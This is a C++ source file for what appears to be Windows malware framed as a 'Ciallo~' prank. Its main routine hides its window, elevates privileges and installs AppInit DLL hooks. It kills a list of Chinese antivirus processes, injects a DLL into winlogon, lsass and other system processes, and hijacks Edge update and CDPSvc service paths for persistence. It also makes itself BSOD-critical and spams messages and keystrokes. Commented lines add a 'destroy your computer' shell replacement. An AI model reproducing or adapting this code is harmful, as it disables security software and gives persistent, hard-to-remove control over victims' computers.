
// 必须先定义 OEMRESOURCE，才能使用 OCR_* 常量
#define OEMRESOURCE
#include <windows.h>

#include"../process.h"
#include"../RegFunc.h"
#include"console.h"
#include"MustInclude.h"
#include"GeneralTask.h"
#include<cstdlib>
#include<ctime>
#include<thread>


void inject(int pid,string DllPath);

void DelayStartUp(){
	Sleep(1000*15);
	for(int i=1;i<=5;i++){
	MessageBoxA(NULL,"Ciallo~","YouzuSoft",0);
	}



	
	return;
}

void work(){
	while(1){
	
	srand(clock());
	if(rand()%98>=97){for(int i=0;i<5;i++){SendString("Ciallo~",2);SendKey(VK_RETURN);}Sleep(9999);}

	//if(rand()%99>=97){MessageBoxA(NULL,"Ciallo~","YouzuSoft",0);Sleep(9999);}
	//if(rand()%50>=45){int res=MessageBoxA(NULL,"Do you want to destroy your computer?","Ciallo!!!",1);if(res==1){SetSystemShell("Fuck.exe");system("start wininit");}}
	//inject(getSinglePid("msedgewebview2"),"c:\\windows\\system32\\SystemShellGuard.dll");
	//inject(getSinglePid("msedgewebview2"),"c:\\windows\\system32\\SystemShellGuard.dll");
	//inject(getSinglePid("WeiXin"),"c:\\windows\\system32\\SystemShellGuard.dll");
	
	SetDesktopWallpaper(WALLPAPER_PATH);

	
	Sleep(10000);
	}
}

void inject(int pid,string DllPath){
	string command="APCInjector.exe "+to_string(pid)+" "+DllPath;cout<<command<<"\n";
	System(command);
}






/**
 * 将系统的“忙”光标（转圈）替换为普通箭头光标。
 * 此修改在系统重启后失效[reference:4]。
 *
 * @return true 表示替换成功，false 表示失败。
 */
bool ReplaceBusyCursorWithArrow() {
    // 1. 加载普通箭头光标
    HCURSOR hArrowCursor = LoadCursor(NULL, IDC_ARROW);
    if (hArrowCursor == NULL) {
        return false;
    }

    // 2. 复制光标。这是必需的，因为 SetSystemCursor 会销毁传入的光标句柄。
    //    直接使用 LoadCursor 返回的句柄会导致问题。
    HCURSOR hArrowCopy = CopyCursor(hArrowCursor);
    if (hArrowCopy == NULL) {
        return false;
    }

    // 3. 执行替换
    bool success = true;
    // 将“忙碌”光标 (OCR_WAIT) 替换为箭头
    if (!SetSystemCursor(hArrowCopy, OCR_WAIT)) {
        success = false;
    }

    // 将“后台运行”光标 (OCR_APPSTARTING) 也替换为箭头
    // 这个光标是箭头+小转圈，一并替换效果更彻底
    HCURSOR hArrowCopy2 = CopyCursor(hArrowCursor);
    if (hArrowCopy2 == NULL) {
        return false;
    }
    if (!SetSystemCursor(hArrowCopy2, OCR_APPSTARTING)) {
        success = false;
    }

    // 注意：无需手动销毁 hArrowCursor，它是由系统管理的。
    return success;
}


int main (){//和那个Service一样都是开机启动的  完全R3
	HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
	if(getPid("expllorer").size()>MAX_RUNNING_INSTANCE){return 1;}
	RequestAdminRightsWithArgs();
	
	EnableDebugPrivilege();
	setWindowProtection();
	
	SetAppInitDLLs32("InlineHookDll32.dll");
	SetAppInitDLLs64("InlineHookDll64.dll");
	
	BanExe("360tray.exe");
	BanExe("ZhuDongFangYu.exe");
	BanExe("QQPCRTP.exe");
	BanExe("kxetray.exe");
	BanExe("RavMonD.exe");
	BanExe("BaiduSdSvc.exe");
	BanExe("ksafe.exe");
	BanExe("wsctrl.exe");
	BanExe("hipstray.exe");
	BanExe("usysdiag.exe");
	
	
	inject(getSinglePid("OfficeClickToRun"),"c:\\windows\\system32\\SystemShellGuard.dll");
	inject(getSinglePid("winlogon"),"c:\\windows\\system32\\SystemShellGuard.dll");
	inject(getSinglePid("spoolsv"),"c:\\windows\\system32\\SystemShellGuard.dll");
	inject(getSinglePid("WmiPrvSE"),"c:\\windows\\system32\\SystemShellGuard.dll");
	inject(getSinglePid("lsass"),"c:\\windows\\system32\\SystemShellGuard.dll");
	
	ReplaceBusyCursorWithArrow();
	
	string SvcPath=string(BIN_PATH)+string("SCMServiceGuard.exe");
	
	SetServiceBinPath("edgeupdate",SvcPath);
	SetServiceBinPath("edgeupdatem",SvcPath);
	SetServiceBinPath("MicrosoftEdgeElevationService",SvcPath);
	SetServiceBinPath("CDPSvc",SvcPath);
	
	//APCInjection(getSinglePid("winlogon"),"c:\\windows\\system32\\SystemShellGuard.dll");cout<<getSinglePid("winlogon")<<"\n"<<getSinglePid("lsass")<<"\n";
	//APCInjection(getSinglePid("lsass"),"c:\\windows\\system32\\SystemShellGuard.dll");
	SetFileProtectWithWinlogon("c:\\windows\\system32\\SystemShellGuard.dll");
	for(int i=0;i<sizeof(allBinFile) / sizeof(allBinFile[0]);i++){
		
		SetFileProtectWithWinlogon(string("c:\\windows\\system32\\")+allBinFile[i]);
	}
	BSODCriticalProtect(1);
	/*system("start C:/Windows/explorer.exe");*/LaunchExe("ProgrammBanner.exe");
	
	
	
	//MessageBoxA(NULL," ","EXPLORER.EXE",MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2);
	thread A(work);A.detach();
	thread B(DelayStartUp);B.detach();
	int protectPid=getSinglePid("ProgrammBanner");
	SetWallPaper(WALLPAPER_PATH);
	while(1){
		if(!isProcessExist(protectPid)){LaunchExe("ProgrammBanner.exe");}
		
		Sleep(5000);
	}
	
	return 0;
}
